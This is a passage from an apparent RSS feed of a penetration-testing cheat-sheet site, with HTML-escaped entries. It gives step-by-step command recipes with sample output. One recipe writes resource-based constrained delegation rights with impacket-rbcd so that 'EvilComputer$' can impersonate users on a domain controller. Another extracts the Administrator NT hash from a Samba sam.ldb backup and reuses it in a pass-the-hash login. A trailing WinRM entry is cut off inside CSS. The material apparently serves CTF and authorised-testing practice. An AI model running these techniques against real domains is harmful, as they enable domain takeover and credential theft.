data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;small&gt;&lt;em&gt;Note: Delegate from an account with SPN, which may not be a computer.&lt;/em&gt;&lt;/small&gt;&#xA;&lt;br&gt;&#xA;&lt;small&gt;&lt;em&gt;Note: Remove trailing $ if not a machine account.&lt;/em&gt;&lt;/small&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Samba</title>
      <link>https://tldrbins.github.io/samba/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/samba/</guid>
      <description>&lt;h3 id=&#34;priesc-1-retrieve-ntlm-from-samba-backup&#34;&gt;Priesc #1: Retrieve NTLM from Samba Backup&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;ldbsearch&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-query-unicodepwd-of-target-user&#34;&gt;1. Query &amp;apos;unicodepwd&amp;apos; of Target User&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;ldbsearch -H sam.ldb &amp;#39;(samaccountname=&amp;lt;USER&amp;gt;)&amp;#39; &amp;#39;unicodepwd&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ldbsearch -H sam.ldb &lt;span class=&#34;s1&#34;&gt;&amp;#39;(samaccountname=Administrator)&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;unicodepwd&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; record &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;dn: CN=Administrator,CN=Users,DC=example,DC=com&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;unicodePwd:: iEb36u6PsRetBr3YMLdYbA==&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Referral&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;ref: ldap:///CN=Configuration,DC=example,DC=com&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Referral&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;ref: ldap:///DC=DomainDnsZones,DC=example,DC=com&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Referral&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;ref: ldap:///DC=ForestDnsZones,DC=example,DC=com&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; returned &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; records&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; entries&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; referrals&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-convert-to-hex&#34;&gt;2. Convert to Hex&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;echo -n &amp;#39;&amp;lt;UNICODEPWD&amp;gt;&amp;#39; | base64 -d | xxd -p   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;iEb36u6PsRetBr3YMLdYbA==&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xxd -p   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;8846f7eaee8fb117ad06bdd830b7586c&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-pass-the-hash&#34;&gt;3. Pass-The-Hash&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;HASH&amp;gt;&amp;#39; --pw-nt-hash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; smbclient -L &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;dc.example.com&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt; -U &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/Administrator%8846f7eaee8fb117ad06bdd830b7586c&amp;#39;&lt;/span&gt; --pw-nt-hash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;gensec_gse_client_prepare_ccache: Kinit for Administrator@EXAMPLE.COM to access cifs/dc.example.com failed: Preauthentication failed: NT_STATUS_LOGON_FAILURE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;        Sharename       Type      Comment&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        ---------       ----      -------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        sysvol          Disk      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        netlogon        Disk      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        home            Disk      Home Directories&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Reconnecting with SMB1 for workgroup listing.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;smbXcli_negprot_smb1_done: No compatible protocol selected by server.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Protocol negotiation to server dc.example.com (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Unable to connect with SMB1 -- no workgroup available&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WinRM</title>
      <link>https://tldrbins.github.io/winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/winrm/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode 